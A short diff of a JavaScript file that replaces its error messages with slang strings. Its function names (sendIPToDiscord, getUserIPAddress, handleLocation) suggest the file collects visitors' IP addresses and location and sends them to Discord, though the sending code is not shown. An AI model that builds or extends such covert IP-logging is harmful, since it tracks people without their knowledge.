@@ -25,7 +25,7 @@ async function sendIPToDiscord() {
       console.error("negawatt");
     }
   } catch (error) {
-    console.error("An error occurred:", error);
+    console.error("neggwatt", error);
   }
 }
 
@@ -91,7 +91,7 @@ async function handleLocation() {
       fadeInImage();
     }
   } catch (error) {
-    console.error("An error occurred:", error);
+    console.error("bludl", error);
   }
 }
 
@@ -101,8 +101,8 @@ async function getUserIPAddress() {
     const data = await response.json();
     return data.ip;
   } catch (error) {
-    console.error("An error occurred while retrieving IP address:", error);
-    return "IP address retrieval error";
+    console.error("dang gang", error);
+    return "get betta wifi";
   }
 }
 
